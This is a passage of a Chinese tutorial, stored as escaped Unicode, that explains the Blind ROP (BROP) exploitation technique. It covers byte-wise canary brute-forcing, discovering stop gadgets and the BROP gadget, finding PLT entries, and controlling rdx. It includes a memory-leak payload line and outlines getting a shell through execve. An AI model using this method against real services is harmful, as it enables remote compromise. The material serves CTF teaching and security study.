\u8981\u5411\u5f97\u5230canary\u4ee5\u53ca\u4e4b\u540e\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u9700\u8981\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u5f97\u5230overflow\u7684\u957f\u5ea6\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e0d\u65ad\u5c1d\u8bd5\u6765\u83b7\u53d6\u3002 \u5176\u6b21\uff0c\u5173\u4e8ecanary\u4ee5\u53ca\u540e\u9762\u7684\u53d8\u91cf\uff0c\u6240\u91c7\u7528\u7684\u7684\u65b9\u6cd5\u4e00\u81f4\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5canary\u4e3a\u4f8b\u3002 canary\u672c\u8eab\u53ef\u4ee5\u901a\u8fc7\u7206\u7834\u6765\u83b7\u53d6\uff0c\u4f46\u662f\u5982\u679c\u53ea\u662f\u611a\u8822\u5730\u679a\u4e3e\u6240\u6709\u7684\u6570\u503c\u7684\u8bdd\uff0c\u663e\u7136\u662f\u4f4e\u6548\u7684\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u6761\u4ef62\u8868\u660e\u4e86\u7a0b\u5e8f\u672c\u8eab\u5e76\u4e0d\u4f1a\u56e0\u4e3acrash\u6709\u53d8\u5316\uff0c\u6240\u4ee5\u6bcf\u6b21\u7684canary\u7b49\u503c\u90fd\u662f\u4e00\u6837\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u8fdb\u884c\u7206\u7834\u3002\u6b63\u5982\u8bba\u6587\u4e2d\u6240\u5c55\u793a\u7684\uff0c\u6bcf\u4e2a\u5b57\u8282\u6700\u591a\u6709256\u79cd\u53ef\u80fd\uff0c\u6240\u4ee5\u572832\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6700\u591a\u9700\u8981\u7206\u78341024\u6b21\uff0c64\u4f4d\u6700\u591a\u7206\u78342048\u6b21\u3002 Blind ROP \u00b6 \u57fa\u672c\u601d\u8def \u00b6 \u6700\u6734\u7d20\u7684\u6267\u884cwrite\u51fd\u6570\u7684\u65b9\u6cd5\u5c31\u662f\u6784\u9020\u7cfb\u7edf\u8c03\u7528\u3002 pop rdi ; ret # socket pop rsi ; ret # buffer pop rdx ; ret # length pop rax ; ret # write syscall number syscall \u4f46\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u6837\u7684\u65b9\u6cd5\u90fd\u662f\u6bd4\u8f83\u56f0\u96be\u7684\uff0c\u56e0\u4e3a\u60f3\u8981\u627e\u5230\u4e00\u4e2asyscall\u7684\u5730\u5740\u57fa\u672c\u4e0d\u53ef\u80fd\u3002\u3002\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8f6c\u6362\u4e3a\u627ewrite\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002 BROP gadgets \u00b6 \u9996\u5148\uff0c\u5728libc_csu_init\u7684\u7ed3\u5c3e\u4e00\u957f\u4e32\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u504f\u79fb\u6765\u83b7\u53d6write\u51fd\u6570\u8c03\u7528\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u3002\u6b63\u5982\u6587\u4e2d\u6240\u5c55\u793a\u7684 find a call write \u00b6 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7plt\u8868\u6765\u83b7\u53d6write\u7684\u5730\u5740\u3002 control rdx \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0crdx\u53ea\u662f\u6211\u4eec\u7528\u6765\u8f93\u51fa\u7a0b\u5e8f\u5b57\u8282\u957f\u5ea6\u7684\u53d8\u91cf\uff0c\u53ea\u8981\u4e0d\u4e3a0\u5373\u53ef\u3002\u4e00\u822c\u6765\u8bf4\u7a0b\u5e8f\u4e2d\u7684rdx\u7ecf\u5e38\u6027\u4f1a\u4e0d\u662f\u96f6\u3002\u4f46\u662f\u4e3a\u4e86\u66f4\u597d\u5730\u63a7\u5236\u7a0b\u5e8f\u8f93\u51fa\uff0c\u6211\u4eec\u4ecd\u7136\u5c3d\u91cf\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\uff0c\u5728\u7a0b\u5e8f pop rdx ; ret \u8fd9\u6837\u7684\u6307\u4ee4\u51e0\u4e4e\u6ca1\u6709\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u63a7\u5236rdx\u7684\u6570\u503c\u5462\uff1f\u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u6267\u884cstrcmp\u7684\u65f6\u5019\uff0crdx\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u5c06\u8981\u88ab\u6bd4\u8f83\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u627e\u5230strcmp\u51fd\u6570\uff0c\u4ece\u800c\u6765\u63a7\u5236rdx\u3002 \u90a3\u4e48\u63a5\u4e0b\u6765\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u4e3a\u4e24\u9879 \u5bfb\u627egadgets \u5bfb\u627ePLT\u8868 write\u5165\u53e3 strcmp\u5165\u53e3 \u5bfb\u627egadgets \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u6765\u60f3\u529e\u6cd5\u5bfb\u627egadgets\u3002\u6b64\u65f6\uff0c\u7531\u4e8e\u5c1a\u672a\u77e5\u9053\u7a0b\u5e8f\u5177\u4f53\u957f\u4ec0\u4e48\u6837\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u901a\u8fc7\u7b80\u5355\u7684\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u81ea\u5df1\u8bbe\u7f6e\u7684\u503c\uff0c\u4ece\u800c\u800c\u6765\u731c\u6d4b\u76f8\u5e94\u7684gadgets\u3002\u800c\u5f53\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u65f6\uff0c\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5 \u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83 \u7a0b\u5e8f\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u540e\u5d29\u6e83 \u7a0b\u5e8f\u4e00\u76f4\u8fd0\u884c\u800c\u5e76\u4e0d\u5d29\u6e83 \u4e3a\u4e86\u5bfb\u627e\u5408\u7406\u7684gadgets\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e24\u6b65 \u5bfb\u627estop gadgets \u00b6 \u6240\u8c13 stop gadget \u4e00\u822c\u6307\u7684\u662f\u8fd9\u6837\u4e00\u6bb5\u4ee3\u7801\uff1a\u5f53\u7a0b\u5e8f\u7684\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165\u65e0\u9650\u5faa\u73af\uff0c\u8fd9\u6837\u4f7f\u5f97\u653b\u51fb\u8005\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u8fde\u63a5\u72b6\u6001\u3002 \u5176\u5b9estop gadget\u4e5f\u5e76\u4e0d\u4e00\u5b9a\u5f97\u662f\u4e0a\u9762\u7684\u6837\u5b50\uff0c\u5176\u6839\u672c\u7684\u76ee\u7684\u5728\u4e8e\u544a\u8bc9\u653b\u51fb\u8005\uff0c\u6240\u6d4b\u8bd5\u7684\u8fd4\u56de\u5730\u5740\u662f\u4e00\u4e2agadgets\u3002 \u4e4b\u6240\u4ee5\u8981\u5bfb\u627estop gadgets\uff0c\u662f\u56e0\u4e3a\u5f53\u6211\u4eec\u731c\u5230\u67d0\u4e2agadgtes\u540e\uff0c\u5982\u679c\u6211\u4eec\u4ec5\u4ec5\u662f\u5c06\u5176\u5e03\u7f6e\u5728\u6808\u4e0a\uff0c\u7531\u4e8e\u6267\u884c\u5b8c\u8fd9\u4e2agadget\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8fd8\u4f1a\u8df3\u5230\u6808\u4e0a\u7684\u4e0b\u4e00\u4e2a\u5730\u5740\u3002\u5982\u679c\u8be5\u5730\u5740\u662f\u975e\u6cd5\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1acrash\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5728\u653b\u51fb\u8005\u770b\u6765\u7a0b\u5e8f\u53ea\u662f\u5355\u7eaf\u7684crash\u4e86\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u4f1a\u8ba4\u4e3a\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5e76\u6ca1\u6709\u6267\u884c\u5230\u4efb\u4f55\u7684 useful gadget \uff0c\u4ece\u800c\u653e\u5f03\u5b83\u3002\u4f8b\u5b50\u5982\u4e0b\u56fe \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u5e03\u7f6e\u4e86 stop gadget \uff0c\u90a3\u4e48\u5bf9\u4e8e\u6211\u4eec\u6240\u8981\u5c1d\u8bd5\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\uff0c\u5982\u679c\u5b83\u662f\u4e00\u4e2agadget\u7684\u8bdd\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662f\u53bb\u60f3\u529e\u6cd5\u8bc6\u522b\u8fd9\u4e9bgadget\u3002 \u8bc6\u522b gadgets \u00b6 \u90a3\u4e48\uff0c\u6211\u4eec\u8be5\u5982\u4f55\u8bc6\u522b\u8fd9\u4e9bgadgets\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6808\u5e03\u5c40\u4ee5\u53ca\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8fdb\u884c\u8bc6\u522b\u3002\u4e3a\u4e86\u66f4\u52a0\u5bb9\u6613\u5730\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u5b9a\u4e49\u6808\u4e0a\u7684\u4e09\u79cd\u5730\u5740 Probe \u63a2\u9488\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u60f3\u8981\u63a2\u6d4b\u7684\u4ee3\u7801\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u90fd\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece0x400000\u5c1d\u8bd5\uff0c\u5982\u679c\u4e0d\u6210\u529f\uff0c\u6709\u53ef\u80fd\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u518d\u4e0d\u6d4e\uff0c\u5c31\u53ef\u80fd\u662f\u7a0b\u5e8f\u662f32\u4f4d\u4e86\u3002\u3002\u8fd9\u91cc\u6211\u8fd8\u6ca1\u6709\u7279\u522b\u60f3\u660e\u767d\uff0c\u600e\u4e48\u53ef\u4ee5\u5feb\u901f\u786e\u5b9a\u8fdc\u7a0b\u7684\u4f4d\u6570\u3002 Stop \u4e0d\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684stop gadget\u7684\u5730\u5740\u3002 Trap \u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\u7684\u5730\u5740 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u6808\u4e0a\u6446\u653e\u4e0d\u540c\u987a\u5e8f\u7684 Stop \u4e0e Trap \u4ece\u800c\u6765\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u3002\u56e0\u4e3a\u6267\u884cStop\u610f\u5473\u7740\u7a0b\u5e8f\u4e0d\u4f1a\u5d29\u6e83\uff0c\u6267\u884cTrap\u610f\u5473\u7740\u7a0b\u5e8f\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\u8fd9\u91cc\u7ed9\u51fa\u51e0\u4e2a\u4f8b\u5b50 probe,stop,traps(traps,traps,...) \u6211\u4eec\u901a\u8fc7\u7a0b\u5e8f\u5d29\u6e83\u4e0e\u5426( \u5982\u679c\u7a0b\u5e8f\u5728probe\u5904\u76f4\u63a5\u5d29\u6e83\u600e\u4e48\u5224\u65ad )\u53ef\u4ee5\u627e\u5230\u4e0d\u4f1a\u5bf9\u6808\u8fdb\u884cpop\u64cd\u4f5c\u7684gadget\uff0c\u5982 ret xor eax,eax; ret probe,trap,stop,traps \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u627e\u5230\u53ea\u662f\u5f39\u51fa\u4e00\u4e2a\u6808\u53d8\u91cf\u7684gadget\u3002\u5982 pop rax; ret pop rdi; ret probe, trap, trap, trap, trap, trap, trap, stop, traps \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u5e03\u5c40\u6765\u627e\u5230\u5f39\u51fa6\u4e2a\u6808\u53d8\u91cf\u7684gadget\uff0c\u4e5f\u5c31\u662f\u4e0ebrop gadget\u76f8\u4f3c\u7684gadget\u3002 \u8fd9\u91cc\u611f\u89c9\u539f\u6587\u662f\u6709\u95ee\u9898\u7684\uff0c\u6bd4\u5982\u8bf4\u5982\u679c\u9047\u5230\u4e86\u53ea\u662fpop\u4e00\u4e2a\u6808\u53d8\u91cf\u7684\u5730\u5740\uff0c\u5176\u5b9e\u4e5f\u662f\u4e0d\u4f1a\u5d29\u6e83\u7684\uff0c\uff0c \u8fd9\u91cc\u4e00\u822c\u6765\u8bf4\u4f1a\u9047\u5230\u4e24\u5904\u6bd4\u8f83\u6709\u610f\u601d\u7684\u5730\u65b9 plt\u5904\u4e0d\u4f1a\u5d29\uff0c\uff0c _start\u5904\u4e0d\u4f1a\u5d29\uff0c\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u91cd\u65b0\u6267\u884c\u3002 \u4e4b\u6240\u4ee5\u8981\u5728\u6bcf\u4e2a\u5e03\u5c40\u7684\u540e\u9762\u90fd\u653e\u4e0atrap\uff0c\u662f\u4e3a\u4e86\u80fd\u591f\u8bc6\u522b\u51fa\uff0c\u5f53\u6211\u4eec\u7684probe\u5904\u5bf9\u5e94\u7684\u5730\u5740\u6267\u884c\u7684\u6307\u4ee4\u8df3\u8fc7\u4e86stop\uff0c\u7a0b\u5e8f\u7acb\u9a6c\u5d29\u6e83\u7684\u884c\u4e3a\u3002 \u4f46\u662f\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u6211\u4eec\u4ecd\u7136\u96be\u4ee5\u8bc6\u522b\u51fa\u6b63\u5728\u6267\u884c\u7684gadget\u5230\u5e95\u662f\u5728\u5bf9\u54ea\u4e2a\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u3002 \u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u5411BROP\u8fd9\u6837\u7684\u4e00\u4e0b\u5b50\u5f39\u51fa6\u4e2a\u5bc4\u5b58\u5668\u7684gadgets\uff0c\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u7ecf\u5e38\u51fa\u73b0\u3002\u6240\u4ee5\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u8fd9\u6837\u7684gadgets\uff0c\u90a3\u4e48\uff0c\u6709\u5f88\u5927\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u4e2agadgets\u5c31\u662fbrop gadgets\u3002\u6b64\u5916\uff0c\u8fd9\u4e2agadgets\u901a\u8fc7\u9519\u4f4d\u8fd8\u53ef\u4ee5\u751f\u6210pop rsp\u7b49\u8fd9\u6837\u7684gadgets\uff0c\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u8bc6\u522b\u8fd9\u4e2agadgets\u7684\u6807\u5fd7\u3002 \u6b64\u5916\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5b66\u7684ret2libc_csu_init\u53ef\u4ee5\u77e5\u9053\u8be5\u5730\u5740\u51cf\u53bb0x1a\u5c31\u4f1a\u5f97\u5230\u5176\u4e0a\u4e00\u4e2agadgets\u3002\u53ef\u4ee5\u4f9b\u6211\u4eec\u8c03\u7528\u5176\u5b83\u51fd\u6570\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662fprobe\u53ef\u80fd\u662f\u4e00\u4e2astop gadget\uff0c\u6211\u4eec\u5f97\u53bb\u68c0\u67e5\u4e00\u4e0b\uff0c\u600e\u4e48\u68c0\u67e5\u5462\uff1f\u6211\u4eec\u53ea\u9700\u8981\u8ba9\u540e\u9762\u6240\u6709\u7684\u5185\u5bb9\u53d8\u4e3atrap\u5730\u5740\u5373\u53ef\u3002\u56e0\u4e3a\u5982\u679c\u662fstop gadget\u7684\u8bdd\uff0c\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u5c31\u4f1a\u5d29\u6e83\u3002\u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6709\u610f\u601d. \u5bfb\u627ePLT \u00b6 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u7a0b\u5e8f\u7684plt\u8868\u5177\u6709\u6bd4\u8f83\u89c4\u6574\u7684\u7ed3\u6784\uff0c\u6bcf\u4e00\u4e2aplt\u8868\u9879\u90fd\u662f16\u5b57\u8282\u3002\u800c\u4e14\uff0c\u5728\u6bcf\u4e00\u4e2a\u8868\u9879\u76846\u5b57\u8282\u504f\u79fb\u5904\uff0c\u662f\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u51fd\u6570\u7684\u89e3\u6790\u8def\u5f84\uff0c\u5373\u7a0b\u5e8f\u6700\u521d\u6267\u884c\u8be5\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u6267\u884c\u8be5\u8def\u5f84\u5bf9\u51fd\u6570\u7684got\u5730\u5740\u8fdb\u884c\u89e3\u6790\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u5927\u591a\u6570plt\u8c03\u7528\u6765\u8bf4\uff0c\u4e00\u822c\u90fd\u4e0d\u5bb9\u6613\u5d29\u6e83\uff0c\u5373\u4f7f\u662f\u4f7f\u7528\u4e86\u6bd4\u8f83\u5947\u602a\u7684\u53c2\u6570\u3002\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u7cfb\u5217\u7684\u957f\u5ea6\u4e3a16\u7684\u6ca1\u6709\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u7684\u4ee3\u7801\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4e00\u5b9a\u7684\u7406\u7531\u76f8\u4fe1\u6211\u4eec\u9047\u5230\u4e86plt\u8868\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u524d\u540e\u504f\u79fb6\u5b57\u8282\uff0c\u6765\u5224\u65ad\u6211\u4eec\u662f\u5904\u4e8eplt\u8868\u9879\u4e2d\u95f4\u8fd8\u662f\u8bf4\u5904\u4e8e\u5f00\u5934\u3002 \u63a7\u5236rdx \u00b6 \u5f53\u6211\u4eec\u627e\u5230plt\u8868\u4e4b\u540e\uff0c\u4e0b\u9762\uff0c\u6211\u4eec\u5c31\u8be5\u60f3\u529e\u6cd5\u6765\u63a7\u5236rdx\u7684\u6570\u503c\u4e86\uff0c\u90a3\u4e48\u8be5\u5982\u4f55\u786e\u8ba4strcmp\u7684\u4f4d\u7f6e\u5462\uff1f\u9700\u8981\u63d0\u524d\u8bf4\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528strcmp\u51fd\u6570\uff0c\u6240\u4ee5\u5728\u6ca1\u6709\u8c03\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c31\u5f97\u5229\u7528\u5176\u5b83\u65b9\u5f0f\u6765\u63a7\u5236rdx\u7684\u503c\u4e86\u3002\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u4e2d\u4f7f\u7528strcmp\u51fd\u6570\u7684\u60c5\u51b5\u3002 \u4e4b\u524d\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop\u7684gadgets\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u51fd\u6570\u7684\u524d\u4e24\u4e2a\u53c2\u6570\u4e86\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u4ee5\u4e0b\u4e24\u79cd\u5730\u5740 readable\uff0c\u53ef\u8bfb\u7684\u5730\u5740\u3002 bad, \u975e\u6cd5\u5730\u5740\uff0c\u4e0d\u53ef\u8bbf\u95ee\uff0c\u6bd4\u5982\u8bf40x0\u3002 \u90a3\u4e48\u6211\u4eec\u5982\u679c\u63a7\u5236\u4f20\u9012\u7684\u53c2\u6570\u4e3a\u8fd9\u4e24\u79cd\u5730\u5740\u7684\u7ec4\u5408\uff0c\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5 strcmp(bad,bad) strcmp(bad,readable) strcmp(readable,bad) strcmp(readable,readable) \u53ea\u6709\u6700\u540e\u4e00\u79cd\u683c\u5f0f\uff0c\u7a0b\u5e8f\u624d\u4f1a\u6b63\u5e38\u6267\u884c\u3002 \u6ce8 \uff1a\u5728\u6ca1\u6709PIE\u4fdd\u62a4\u7684\u65f6\u5019\uff0c64\u4f4d\u7a0b\u5e8f\u7684ELF\u6587\u4ef6\u76840x400000\u5904\u67097\u4e2a\u975e\u96f6\u5b57\u8282\u3002 \u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u5177\u4f53\u5730\u53bb\u505a\u5462\uff1f\u6709\u4e00\u79cd\u6bd4\u8f83\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u4ece\u5934\u5230\u5c3e\u4f9d\u6b21\u626b\u63cf\u6bcf\u4e2aplt\u8868\u9879\uff0c\u4f46\u662f\u8fd9\u4e2a\u5374\u6bd4\u8f83\u9ebb\u70e6\u3002\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u5982\u4e0b\u7684\u4e00\u79cd\u65b9\u6cd5 \u5229\u7528plt\u8868\u9879\u7684\u6162\u8def\u5f84 \u5e76\u4e14\u5229\u7528\u4e0b\u4e00\u4e2a\u8868\u9879\u7684\u6162\u8def\u5f84\u7684\u5730\u5740\u6765\u8986\u76d6\u8fd4\u56de\u5730\u5740 \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u6765\u56de\u63a7\u5236\u76f8\u5e94\u7684\u53d8\u91cf\u4e86\u3002 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u78b0\u5de7\u627e\u5230strncmp\u6216\u8005strcasecmp\u51fd\u6570\uff0c\u5b83\u4eec\u5177\u6709\u548cstrcmp\u4e00\u6837\u7684\u6548\u679c\u3002 \u5bfb\u627e\u8f93\u51fa\u51fd\u6570 \u00b6 \u5bfb\u627e\u8f93\u51fa\u51fd\u6570\u65e2\u53ef\u4ee5\u5bfb\u627ewrite\uff0c\u4e5f\u53ef\u4ee5\u5bfb\u627eputs\u3002\u4e00\u822c\u73b0\u5148\u627eputs\u51fd\u6570\u3002\u4e0d\u8fc7\u8fd9\u91cc\u4e3a\u4e86\u4ecb\u7ecd\u65b9\u4fbf\uff0c\u5148\u4ecb\u7ecd\u5982\u4f55\u5bfb\u627ewrite\u3002 \u5bfb\u627ewrite@plt \u00b6 \u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236write\u51fd\u6570\u7684\u4e09\u4e2a\u53c2\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u518d\u6b21\u904d\u5386\u6240\u6709\u7684plt\u8868\uff0c\u6839\u636ewrite\u51fd\u6570\u5c06\u4f1a\u8f93\u51fa\u5185\u5bb9\u6765\u627e\u5230\u5bf9\u5e94\u7684\u51fd\u6570\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6709\u4e2a\u6bd4\u8f83\u9ebb\u70e6\u7684\u5730\u65b9\u5728\u4e8e\u6211\u4eec\u9700\u8981\u627e\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u627e\u5230\u8fd9\u4e2a\u503c \u4f7f\u7528rop chain\uff0c\u540c\u65f6\u4f7f\u5f97\u6bcf\u4e2arop\u5bf9\u5e94\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e0d\u4e00\u6837 \u540c\u65f6\u6253\u5f00\u591a\u4e2a\u8fde\u63a5\uff0c\u5e76\u4e14\u6211\u4eec\u4f7f\u7528\u76f8\u5bf9\u8f83\u9ad8\u7684\u6570\u503c\u6765\u8bd5\u4e00\u8bd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f linux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u3002 posix\u6807\u51c6\u6bcf\u6b21\u7533\u8bf7\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u503c\u603b\u662f\u5f53\u524d\u6700\u5c0f\u53ef\u7528\u6570\u503c\u3002 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u5bfb\u627eputs\u51fd\u6570\u3002 \u5bfb\u627eputs@plt \u00b6 \u5bfb\u627eputs\u51fd\u6570(\u8fd9\u91cc\u6211\u4eec\u5bfb\u627e\u7684\u662f plt)\uff0c\u6211\u4eec\u81ea\u7136\u9700\u8981\u63a7\u5236rdi\u53c2\u6570\uff0c\u5728\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u627e\u5230\u4e86brop gadget\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u6839\u636ebrop gadget\u504f\u79fb9\u53ef\u4ee5\u5f97\u5230\u76f8\u5e94\u7684gadgets\uff08\u7531ret2libc_csu_init\u4e2d\u540e\u7eed\u53ef\u5f97\uff09\u3002\u540c\u65f6\u5728\u7a0b\u5e8f\u8fd8\u6ca1\u6709\u5f00\u542fPIE\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b\uff0c0x400000\u5904\u4e3aELF\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u5176\u5185\u5bb9\u4e3a\\x7fELF\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u8fdb\u884c\u5224\u65ad\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5176payload\u5982\u4e0b payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) \u653b\u51fb\u603b\u7ed3 \u00b6 \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5df2\u7ecf\u53ef\u4ee5\u63a7\u5236\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f93\u51fa.text\u6bb5\u66f4\u591a\u7684\u5185\u5bb9\u4ee5\u4fbf\u4e8e\u6765\u627e\u5230\u66f4\u591a\u5408\u9002gadgets\u3002\u540c\u65f6\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u5176\u5b83\u51fd\u6570\uff0c\u5982dup2\u6216\u8005execve\u51fd\u6570\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u653b\u51fb\u8005\u6b64\u65f6\u4f1a\u53bb\u505a\u4e0b\u4e8b\u60c5 \u5c06socket\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u8f93\u5165\u8f93\u51fa \u5bfb\u627e\u201c/bin/sh\u201d\u7684\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6700\u597d\u662f\u627e\u5230\u4e00\u5757\u53ef\u5199\u7684\u5185\u5b58\uff0c\u5229\u7528write\u51fd\u6570\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u76f8\u5e94\u7684\u5730\u5740\u3002 \u6267\u884cexecve\u83b7\u53d6shell\uff0c\u83b7\u53d6execve\u4e0d\u4e00\u5b9a\u5728plt\u8868\u4e2d\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5c31\u9700\u8981\u60f3\u529e\u6cd5\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u4e86\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5HCTF2016\u7684\u51fa\u9898\u4eba\u5931\u8e2a\u4e86\u4e3a\u4f8b\uff0c\u76f8\u5173\u7684\u90e8\u7f72\u6587\u4ef6\u90fd\u653e\u5728\u4e86example\u6587\u4ef6\u5939\u4e0b\u7684\u5bf9\u5e94\u76ee\u5f55\u4e0b\u3002\u57fa\u672c\u601d\u8def\u5982\u4e0b 